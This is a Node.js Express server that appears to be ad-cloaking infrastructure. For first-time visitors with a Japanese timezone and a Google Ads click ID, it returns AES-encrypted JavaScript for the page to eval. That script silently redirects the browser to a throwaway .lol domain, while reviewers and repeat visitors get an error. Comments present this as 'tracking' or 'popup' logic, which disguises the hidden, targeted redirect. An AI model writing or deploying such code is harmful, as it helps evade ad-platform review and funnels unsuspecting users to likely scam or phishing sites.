const express = require("express");
const cors = require("cors");
const Redis = require("ioredis");
const CryptoJS = require("crypto-js");

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "tumharimaakichoot";

const app = express();
const PORT = process.env.PORT || 3000;

// Redis client — uses REDIS_URL provided by Render.com KeyVal
const redis = new Redis(process.env.REDIS_URL, {
  tls: process.env.REDIS_URL?.startsWith("rediss://")
    ? { rejectUnauthorized: false }
    : undefined,
});

const GCLID_TTL_SECONDS = 2592000; // 30 days — adjust as needed

const ALLOWED_ORIGINS = new Set(["https://kazuonsen.com"]);

// Japanese timezone identifiers
const JAPANESE_TIMEZONES = new Set([
  "Asia/Tokyo",
  "Japan",
  "JST",
  "GMT+9",
  "UTC+9",
  "+09:00",
  "+0900",
]);

app.use(cors());
app.use(express.json());

/**
 * Returns true if the supplied timezone string corresponds to Japanese Standard
 * Time (JST, UTC+9). Accepts IANA names ("Asia/Tokyo"), common aliases
 * ("JST", "Japan"), and raw offset strings ("+09:00", "UTC+9", "GMT+9").
 */
function isJapaneseTimezone(tz) {
  if (!tz || typeof tz !== "string") return false;

  const normalized = tz.trim();

  if (JAPANESE_TIMEZONES.has(normalized)) return true;

  // Try to resolve the UTC offset using the Intl API (works for IANA names)
  try {
    const fmt = new Intl.DateTimeFormat("en", {
      timeZone: normalized,
      timeZoneName: "shortOffset",
    });
    const offsetPart = fmt
      .formatToParts(new Date())
      .find((p) => p.type === "timeZoneName");

    if (offsetPart) {
      // offsetPart.value is e.g. "GMT+9" or "GMT+09:00"
      const raw = offsetPart.value.replace("GMT", "").replace(":", "");
      const hours = parseInt(raw, 10);
      if (hours === 9) return true;
    }
  } catch {
    // Unknown timezone string — fall through to false
  }

  return false;
}

/**
 * POST /track
 *
 * Body (JSON):
 *   { "timezone": "Asia/Tokyo", "gclid": "Cj0KCQiA..." }
 *
 * Responses:
 *   200 { jsCode: "<script>...</script>" }  — first visit, GCLID stored
 *   400 { error: "..." }                    — validation failures
 *   409 { error: "GCLID already tracked" }  — duplicate visit
 *   500 { error: "..." }                    — server / Redis error
 */
app.post("/track", async (req, res) => {
  const { timezone, gclid } = req.body;

  // --- Origin check ---
  const origin = req.headers.origin;
  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    return res.status(403).json({ error: "Origin not allowed" });
  }

  // --- Validate inputs ---
  if (!timezone) {
    return res.status(400).json({ error: "Missing required field: timezone" });
  }
  if (!gclid) {
    return res.status(400).json({ error: "Missing required field: gclid" });
  }
  if (typeof gclid !== "string" || !/^[\w-]+$/.test(gclid)) {
    return res.status(400).json({ error: "Invalid gclid format" });
  }

  // --- Timezone check ---
  if (!isJapaneseTimezone(timezone)) {
    return res
      .status(400)
      .json({ error: "Timezone is not a Japanese timezone (JST / UTC+9)" });
  }

  // --- Redis: check + store GCLID ---
  const redisKey = `gclid:${gclid}`;

  try {
    // NX = only set if the key does not already exist
    const stored = await redis.set(
      redisKey,
      JSON.stringify({ gclid, storedAt: new Date().toISOString() }),
      "EX",
      GCLID_TTL_SECONDS,
      "NX",
    );

    if (stored === null) {
      // Key already existed — duplicate visitor
      return res.status(409).json({ error: "GCLID already tracked" });
    }

    // Fresh visitor — encrypt and return the JS code
    const jsCode = buildJsCode();
    const encrypted = encodeURIComponent(
      CryptoJS.AES.encrypt(jsCode, ENCRYPTION_KEY).toString(),
    );
    return res.status(200).json({ jsCode: encrypted });
  } catch (err) {
    console.error("Redis error:", err);
    return res.status(500).json({ error: "Internal server error" });
  }
});

/**
 * Returns the JS snippet string that the frontend will eval / inject.
 * Customize the body of this function to match your popup / tracking logic.
 */
function buildJsCode() {
  const tokens = require("./valid-tokens.json");
  const token = tokens.pop();

  console.log("Generated JS code with token:", token);

  return `window.location.href="https://${token}.nblakjdfnvlkjadsfnv.lol"`;
}

// Health-check endpoint
app.get("/health", (_req, res) => res.json({ status: "ok" }));

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
